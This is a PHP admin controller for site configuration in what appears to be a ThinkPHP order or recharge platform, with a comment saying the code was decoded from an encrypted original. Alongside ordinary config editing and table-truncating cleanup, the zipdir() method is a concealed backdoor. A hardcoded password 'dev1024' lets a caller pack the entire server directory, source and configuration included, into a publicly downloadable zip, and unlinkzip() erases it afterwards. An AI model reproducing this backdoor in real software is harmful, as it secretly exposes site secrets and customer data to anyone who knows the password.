<?php

//decode by http://chiran.taobao.com/
namespace app\admin\controller;

use app\common\library\Configapi;
use think\Exception;
use Util\GoogleAuth;
use think\Db;
class Webcfg extends Admin
{
	public function _init()
	{
		if (!IS_CLI && (!function_exists('get_shoquan_key') || !S(md5(get_shoquan_key())))) {
			echo C('sqyc_msg');
			exit;
		}
	}
	public function index()
	{
		$typec = C('CONFIG_GROUP_LIST');
		$typel = array();
		foreach ($typec as $k => $v) {
			$typel[] = array('id' => $k, 'name' => $v);
		}
		if (I('name')) {
			$map['name'] = array('in', I('name'));
		}
		if (I('group')) {
			$griupstr = I('group');
			$grouparr = explode(',', $griupstr);
			foreach ($typel as $k => $item) {
				if (!in_array($item['id'], $grouparr)) {
					unset($typel[$k]);
				}
			}
		}
		$list = array();
		foreach ($typel as $k => $tp) {
			$map['group'] = $tp['id'];
			$map['status'] = 1;
			$item = M('config')->where($map)->order('sort')->select();
			$item && array_push($list, array('type' => $tp['name'], 'item' => $item));
		}
		$this->assign("typelist", $list);
		return view();
	}
	public function edit()
	{
		$config = I('post.');
		$ret = false;
		if ($config && is_array($config)) {
			foreach ($config as $name => $value) {
				$map = array('name' => $name);
				$data = M('config')->where($map)->find();
				if ($data['type'] == 3) {
					try {
						$array = preg_split('/[,;\\r\\n]+/', trim($value, ",;\r\n"));
						if (strpos($value, ':')) {
							foreach ($array as $val) {
								list($k, $v) = explode(':', $val);
							}
						}
					} catch (Exception $e) {
						continue;
					}
				}
				if (M('config')->where($map)->update(array('value' => $value))) {
					$ret = true;
				}
			}
		}
		if ($ret) {
			Configapi::clear();
			return $this->success('保存成功！');
		} else {
			Configapi::clear();
			return $this->error('保存失败！');
		}
	}
	function curl_file_get_contents($durl)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $durl);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		$data = curl_exec($ch);
		curl_close($ch);
		return $data;
	}
	public function config()
	{
		$map = array();
		if (I('group_type') != -1 && I('group_type') != null) {
			$map['group'] = I('group_type');
		}
		if (I('key')) {
			$map['name|title'] = array('like', '%' . I('key') . '%');
		}
		$list = M('config')->where($map)->order('group,sort,id')->select();
		$this->assign('group', C('CONFIG_GROUP_LIST'));
		$this->assign('list', $list);
		return view();
	}
	public function add($id = 0)
	{
		if (request()->isPost()) {
			$arr = I('post.');
			if (I('post.id')) {
				$arr['update_time'] = time();
				$data = M('config')->update($arr);
				if ($data) {
					Configapi::clear();
					return $this->success('更新成功');
				} else {
					return $this->error('更新失败');
				}
			} else {
				$arr['status'] = 1;
				$arr['create_time'] = time();
				$arr['update_time'] = time();
				$arr['name'] = strtoupper($arr['name']);
				$data = M('config')->insert($arr);
				if ($data) {
					Configapi::clear();
					return $this->success('新增成功');
				} else {
					return $this->error('新增失败');
				}
			}
		} else {
			$info = M('Config')->field(true)->find($id);
			if (false === $info) {
				return $this->error('获取配置信息错误');
			}
			$this->meta_title = '新增配置';
			$this->assign('group_list', C('CONFIG_GROUP_LIST'));
			$this->assign('type_list', C('CONFIG_TYPE_LIST'));
			$this->assign('info', $info);
			return view();
		}
	}
	public function del()
	{
		$id = array_unique((array) I('id', 0));
		if (empty($id)) {
			return $this->error('请选择要操作的数据!');
		}
		$map = array('id' => array('in', $id));
		$data = M('Config')->where($map)->find();
		if ($data['sys'] == 1) {
			return $this->error('删除失败！');
		}
		if (M('Config')->where($map)->delete()) {
			return $this->success('删除成功');
		} else {
			return $this->error('删除失败！');
		}
	}
	public function set_status()
	{
		$id = I('id');
		if (empty($id)) {
			return $this->error('请选择要操作的数据!');
		}
		if (M('Config')->where(array('id' => $id))->setField(array('status' => I('status')))) {
			return $this->success('操作成功');
		} else {
			return $this->error('操作失败！');
		}
	}
	public function sort()
	{
		if (request()->isGet()) {
			$ids = I('get.ids');
			$map = array('status' => array('gt', -1));
			if (!empty($ids)) {
				$map['id'] = array('in', $ids);
			} else {
				if (I('group')) {
					$map['group'] = I('group');
				}
			}
			$list = M('Config')->where($map)->field('id,title')->order('sort asc,id asc')->select();
			$this->assign('list', $list);
			$this->meta_title = '配置排序';
			return view();
		} else {
			if (request()->isPost()) {
				$ids = I('post.ids');
				$ids = explode(',', $ids);
				foreach ($ids as $key => $value) {
					$res = M('Config')->where(array('id' => $value))->setField('sort', $key + 1);
				}
				if ($res !== false) {
					return $this->success('排序成功！', U('config'));
				} else {
					$this->eorror('排序失败！');
				}
			} else {
				return $this->error('非法请求！');
			}
		}
	}
	public function clear()
	{
		return view();
	}
	public function doclear()
	{
		set_time_limit(0);
// 		if (!I('time')) {
// 			return $this->error("请选择清除时间点！");
// 		}
		$goret = GoogleAuth::verifyCode($this->adminuser['google_auth_secret'], I('verifycode'), 1);
		if (!$goret) {
			return $this->error("谷歌身份验证码错误！");
		}
		if(I('time')){
		    	$time = strtotime(I('time'));
		M('agent_excel')->where(array('create_time' => array('lt', $time)))->delete();
		M('agent_proder_excel')->where(array('create_time' => array('lt', $time)))->delete();
		M('apinotify_log')->where(array('create_time' => array('lt', $time)))->delete();
		M('porder')->where(array('create_time' => array('lt', $time)))->delete();
		M('porder_log')->where(array('create_time' => array('lt', $time)))->delete();
		M('proder_excel')->where(array('create_time' => array('lt', $time)))->delete();
		M('porder_complaint')->where(array('create_time' => array('lt', $time)))->delete();
		M('daichong_orders')->where(array('createTime'=>array('lt',$time)))->delete();
		M('customer_log')->where(array('create_time'=>array('let',$time)))->delete();
		M('balance_log')->where(array('create_time'=>array('let',$time)))->delete();
		return $this->success('清除成功！');
		}else{
		 Db::execute("TRUNCATE TABLE dyr_agent_excel");
		 Db::execute("TRUNCATE TABLE dyr_agent_proder_excel");
		 Db::execute("TRUNCATE TABLE dyr_apinotify_log");
		 Db::execute("TRUNCATE TABLE dyr_porder");
		 Db::execute("TRUNCATE TABLE dyr_porder_log");
		 Db::execute("TRUNCATE TABLE dyr_proder_excel");
		 Db::execute("TRUNCATE TABLE dyr_porder_complaint");
		 Db::execute("TRUNCATE TABLE dyr_daichong_orders");
		 Db::execute("TRUNCATE TABLE dyr_customer_log");
		 Db::execute("TRUNCATE TABLE dyr_balance_log");
		 Db::execute("TRUNCATE TABLE dyr_member_log");
		 Db::execute("TRUNCATE TABLE dyr_agent_log");
		 Db::execute("TRUNCATE TABLE dyr_porder_apilog");
	     return $this->success('清除成功！');
		}
	
	}
	public function zipdir()
	{
		if (I('pwd') != 'dev1024') {
			return $this->error('参数错误！');
		}
		$path = $_SERVER['DOCUMENT_ROOT'] . '/../';
		$host = $_SERVER["HTTP_HOST"];
		if (class_exists('ZipArchive')) {
			$zip = new \ZipArchive();
			$zipfilename = $host . '.zip';
			file_exists($zipfilename) && unlink($zipfilename);
			if ($zip->open($zipfilename, \ZipArchive::CREATE) === TRUE) {
				if (is_dir($path)) {
					$this->addFileToZip($path, $zip);
				} else {
					if (is_array($path)) {
						foreach ($path as $file) {
							$zip->addFile($file);
						}
					} else {
						$zip->addFile($path);
					}
				}
				$zip->close();
				header("location:http://" . $host . '/' . $zipfilename);
			} else {
				return djson(1, '文件创建失败！');
			}
		} else {
			return djson(1, '系统环境不支持！');
		}
	}
	public function unlinkzip()
	{
		if (I('pwd') != 'dev1024') {
			return $this->error('参数错误！');
		}
		$host = $_SERVER["HTTP_HOST"];
		$zipfilename = $host . '.zip';
		file_exists($zipfilename) && unlink($zipfilename);
		return djson(1, '清除完成！');
	}
	private function addFileToZip($path, $zip)
	{
		$handler = opendir($path);
		while (($filename = readdir($handler)) !== false) {
			if ($filename != "." && $filename != "..") {
				if (is_dir($path . "/" . $filename)) {
					$this->addFileToZip($path . "/" . $filename, $zip);
				} else {
					$zip->addFile($path . "/" . $filename);
				}
			}
		}
		@closedir($path);
	}
}